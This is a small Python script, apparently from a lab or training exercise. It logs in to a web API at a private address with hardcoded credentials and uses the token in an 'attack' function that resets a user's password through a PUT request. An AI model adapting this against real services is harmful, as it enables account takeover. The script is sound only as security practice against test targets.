import requests
import json
from bs4 import BeautifulSoup

def login(url):
    username = 'name1'
    password = 'pass1'

    headers = {
        "Content-Type": "application/json",
    }

    data = {
        "username": username,
        "password": password
    }

    r = requests.post(url + "/users/v1/login", data=json.dumps(data), headers=headers)

    token = json.loads(r.text)["auth_token"]

    return token


def attack(url):
    username = "name1"
    token = login(url)
    print(token)

    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }

    data = {
        "password": "test123!",
    }

    r = requests.put(url + "/users/v1/" + username + "/password", data=json.dumps(data), headers=headers)
    print(r.text)


def main():
    url = 'http://172.16.54.128:5000'
    #token = login(url)
    attack(url)

if __name__ == '__main__':
    main()